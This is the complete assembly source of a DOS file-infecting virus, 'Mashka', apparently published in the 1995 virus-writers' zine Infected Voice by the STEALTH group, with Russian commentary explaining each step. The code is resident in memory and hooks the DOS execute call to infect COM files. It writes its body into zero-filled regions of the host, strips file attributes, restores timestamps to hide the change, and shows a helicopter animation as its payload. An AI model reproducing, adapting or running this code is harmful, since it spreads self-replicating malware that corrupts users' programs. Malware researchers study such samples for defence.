;█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█  ▀                                        ▀          ██▀██▀██
;█ STEALTH group █░ █ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▀█▀ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ ▄▀▀  ██ ▀▀ ██
;█   presents    █░ █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █  ▀█▀▀  █████ ██
;█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█░ ▐ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄  █████▄██
; ░░░░░░░░░░░░░░░░░                                                     JAN 1995
;
; INFECTED VOICE. Issue 4. January 1995. (C) STEALTH group, Kiev 148, Box 10.
; ===========================================================================


TITLE    Virus Mashka           ; кстати настоящее название !
seg_a segment para 'code'
assume cs:seg_a,ds:seg_a

org 100h

start:
        call $+3              ;старый добрый call
        pop bx
        push es
        sub bx,3                ;начало вируса
        push bx
        mov ax,0e200h         ;традиционная проверка на наличие в памяти
        int 21h
        cmp al,22h
        jnz res               ;если нас нет, значит будем
        jmp short nores       ;мы уже есть
res:
        mov ax,ds
        dec ax
        mov ds,ax                                       ;сегмент MSB
        mov ax,word ptr ds:[3]
        sub ax,(offset virend - offset start)/10h+1+20h ;уменьшаем размер блока
        mov word ptr ds:[3],ax
        mov ax,ds
        inc ax
        mov ds,ax
        mov ax,word ptr ds:[2]                          ;колво свободной памяти
        sub ax,(offset virend - offset start)/10h+1+20h ;отнимаем размер vir'а
        mov es,ax
        mov word ptr ds:[2],ax
        mov cx,offset virend - offset start
        mov si,bx
        xor di,di
        push cs
        pop ds
        rep movsb         ; перекачиваем тело в выделенную область es:di
        push es
        pop ds
        mov ax,3521h     ; ну здесь, надеюсь , вы понимаете , что происходит
        int 21h
        mov word ptr ds:[offset int21e - offset start],bx
        mov word ptr ds:[offset int21e+2 - offset start],es
        mov ax,2521h
        mov dx,offset int21entry - offset start
        int 21h                                   ; перехватываем int 21h
        mov ax,3510h
        int 21h
        mov word ptr ds:[offset int10e - offset start],bx
        mov word ptr ds:[offset int10e+2 - offset start],es
        mov ax,2510h
        mov dx,offset int10entry - offset start
        int 21h                                  ; перехватываем int 10h
                                                 ; для вертолета
nores:
        ; если вирус уже в памяти , то остается только радоваться

        pop bx

        ; сейчас будем получать оригинальные байты программы ,
        ; вырезанные из начала программы

        mov ax,word ptr cs:[bx + offset real - offset start]
        mov bx,word ptr cs:[bx + offset real - offset start + 2]
        push cs
        pop ds
        mov word ptr cs:[100h],ax  ;соответственно возвращаем их на место
        mov word ptr cs:[102h],bx
        mov ax,100h                ;адресс для возврата на начало программы
        pop es
        push ax
        ret

real    dw 4cb4h              ; вот они родимые , оригинальные !
        dw 21cdh

INT21entry:
        cmp ax,0e200h         ; проверяем собственную функцию,
                              ; которую вирус выполняет чтобы проверить
                              ; свое наличие в памяти
        jnz d01
        mov al,22h
        iret
d01:
        cmp ax,0e233h        ; секретная функция , возвращающая оригинальные
                     ; адреса прерываний и размер вируса (для возможности лече-
                     ; ния любой версии
        jnz d1
        mov al,22h
        mov bx,cs
        ; вот они , эти offset'ы
        mov cx,offset real - offset start
        mov dx,offset int21e - offset start
        mov si,offset int10e - offset start
        iret
d1:
        cmp ah,4bh        ; как видите , функция 4b - главная причина заражения
        jz in4b
        jmp exitint21     ; если не 4b , то мы все равно подождем

; Вот сюда обычно попадают , когда делают INT 21h

in4b:
        push ax           ; внимание ЮМОР !  Текстовая строка 'PSQR'
        push bx
        push cx
        push dx

        push es
        push ds
        push si
        push di

        push dx
        push ds
        push cs
        pop ds
        mov ax,2524h
        mov dx,offset int24entry - offset start
        int 21h                                 ;перехват критической ошибки
                                                ;происходит только при запуске,
                                                ;дабы файлы не печатались на
                                                ;принтер , которого нету !
        pop ds
        pop dx

        call cmpnol                     ;ищем ноль в конце пути с именем
        call cmpcom                     ;а не COM ли это случайно ?
        jnc pr1                 ; АГА ! Значит все-таки  COM !
        jmp exit                ; ну не будем заражать, что поделать ...
pr1:
        ;сохраняем в переменные сегмент и смещение запускаемого файла

        mov word ptr cs:[offset adname - offset start],dx
        mov word ptr cs:[offset adname - offset start+2],ds
        call catt                               ;снять атрибуты
        mov ax,3d02h                            ;открываем файл
        int 21h
        mov bx,ax
        call gettime                            ;получаем и сохраняем время

                        ; а этот кусочек здесь конечно зря,
                        ; но это было давно и неправда
        mov ax,4202h
        xor cx,cx
        xor dx,dx
        int 21h

        push ds
        push cs
        pop ds                  ; сегмент данных устанавливаем на код вируса

        mov ax,4200h            ; здесь конечно было все напутано ,но заметьте,
                                ; CX:DX все равно нули
        int 21h

        mov ah,3fh
        mov dx,offset virend - offset start
        mov cx,4h
        int 21h                 ; читаем начало файла в область за вирусом

        ; если заражено , то четвертый байт должен быть 'Q'
        cmp byte ptr ds:[offset virend - offset start + 3],'Q'
        jnz ok2
        pop ds
        jmp closeexit  ; выход с закрытием файла и восстановкой остального
                       ; добра
ok2:
        xor si,si
        mov dx,0 - 200h
p2:
        ;следующий фрагмент считывает в память последовательно весь файл
        ;по 200h и сканирует на определенное количество нулей (а именно 777),

        mov ax,4200h
        add dx,200h
        xor cx,cx
        int 21h
        push ax
        mov ah,3fh
        mov dx,offset virend - offset start
        mov cx,200h
        int 21h
        cmp ax,0
        jnz d3
        pop dx     ; файл закончился
        jmp d2
d3:
        cmp ax,200h
        jz ok4
        add ax,offset virend - offset start
        mov di,ax
        mov word ptr ds:[di],0ffh  ; а это что-то вроде концовочки
ok4:
        call scanspace    ; сканируем прочитанные 200h
        pop dx
        cmp si,offset virend - offset start
        jc p2                 ; если кол-во нулей меньше чем размер вируса
                                ; то продолжаем сканирование

        sub di,(offset virend - offset start)
        add dx,di
        sub dx,si
        push dx                 ; в DX смещение в файле ,которое указывает на
                                ; найденную область с нулями
        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h
        mov ah,3fh
        mov cx,4h
        mov dx,offset real - offset start
        int 21h                             ; читаем реальные байтики прогр.
        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h
        mov si,offset virend - offset start
        mov byte ptr ds:[si],0e9h
        pop dx
        push dx
        sub dx,3
        mov word ptr ds:[si+1],dx       ; подготавливаем начальные четыре байта
        mov byte ptr ds:[si+3],'Q'      ; а это метка зараженности
        mov ah,40h
        mov cx,4h
        mov dx,offset virend - offset start
        int 21h                                 ; записываем их
        pop dx                  ; в DX адрес области с нулями
        xor cx,cx
        mov ax,4200h
        int 21h
        mov ah,40h
        mov cx,offset virend - offset start
        xor dx,dx
        int 21h                                 ; дописываем туда тело вируса
d2:
        pop ds
closeexit:
        call puttime            ; восстанавливаем время
        mov ah,3eh
        int 21h                 ; все ! рабочий день кончился !
exit:
        pop di
        pop si
        pop ds
        pop es
        pop dx
        pop cx
        pop bx
        pop ax
exitint21:
        db 0eah
int21e  dw ?
        dw ?
adname  dw ?
        dw ?
int24entry:
        mov ax,0h       ; а это ABORT ! Хорошо, что мы не в Италии !
        iret
time    dw ?
        dw ?
;-------------------------------------  поиск нуля в конце пути с именем
cmpnol:
        mov bx,dx
nol:
        inc bx
        cmp byte ptr ds:[bx],0h
        jnz nol
        ret
;------------------------------------- проверка на COM
cmpcom:
        cmp word ptr ds:[bx-2],'MO'
        clc
        jz exitcmpexe
        stc
exitcmpexe:
        ret
;--------------------------------------- получение и установка нормальных
;                                                       атрибутов
catt:
        push ds
        push dx
        mov ax,4300h
        LDS dx,dword ptr cs:[offset adname - offset start]
        int 21h
        and cl,11111110b
        mov ax,4301h
        int 21h
        pop dx
        pop ds
        ret
;--------------------------------------- получение и сохранение времени
gettime:
        mov ax,5700h
        int 21h
        and cl,11100000b
        mov word ptr cs:[offset time - offset start],cx
        mov word ptr cs:[offset time - offset start+2],dx
        ret
;----------------------------------------- возвращение старого времени  ;)
puttime:
        mov ax,5701h
        mov cx,word ptr cs:[offset time - offset start]
        mov dx,word ptr cs:[offset time - offset start+2]
        int 21h
        ret
;------------------------------------------ сканирование на нули
scanspace:
        mov di,offset virend - offset start - 1
opsc:
        inc di
        cmp di,(offset virend - offset start) + 200h
        jnc exsc
        mov al,ds:[di]
        cmp al,0
        jnz clscan
        inc si
        jmp opsc
exsc:
        ret
clscan:
        cmp si,offset virend - offset start
        jc ok3
        ret
ok3:
        xor si,si
        jmp opsc

int10entry:
        cmp ax,0005h    ; проверка на установление CGA 320x200
        jz svert      ; если таковой, то рисуем пролетающий вертолет
exitint10:
        db 0eah
int10e  dw ?
        dw ?
svert:
        cmp si,22h
        jz exitint10  ; обходим собственные вызовы

                ; НУ А ЭТО - ВЕРТОЛЕТ !

vert:
        push ds
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push bp
        push es

        push cs
        pop ds
        mov ax,0b800h
        mov es,ax
        mov si,22h
        mov ax,5
        int 10h
        mov cx,70
        mov dx,30
bb:
        push cx
        mov cx,6000h
zlp:
        loop zlp
        pop cx

        call bert
        loop bb
        pop es
        pop bp
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        pop ds
        jmp exitint10
;------------------------
bert:
        push dx
        push cx
        push ax
        push si
        push di

        mov ax,dx
        mov bx,80
        mul bx
        add ax,cx
        mov di,ax
        mov bp,0
        mov si,offset berts - offset start
opbert:
        mov cx,6
        push di
        rep movsb
        pop di
        add di,2000h
        inc bp
        cmp bp,12
        je exbert
        mov cx,6
        push di
        rep movsb
        pop di
        sub di,2000h-80
        inc bp
        cmp bp,12
        je exbert
        jmp opbert
exbert:
        pop di
        pop si
        pop ax
        pop cx
        pop dx
        ret
;================================
berts   db 0,0,0,0,0,0            ; вертолет, или по-украински - хеликоптер
        db 0,0,0,0,0,0
        db 0,0,55h,40h,0,0
        db 0,0,4,0,0,0
        db 0,1,44h,0,0,0
        db 0,15h,55h,0,4,0
        db 0,50h,57h,55h,55h,0
        db 0,15h,75h,55h,4,0
        db 0,5,55h,0,0,0
        db 0,0,10h,0,0,0
        db 0,0,0,0,0,0
        db 0,0,0,0,0,0
;=================================
db '╖ВУр│ЯНШХЯр▀▀р╛Зр╜ОЯЖЗр▀'     ; зашифрованное послание потомкам
                                  ; юзайте NEG.

virend:
seg_a ends
end start
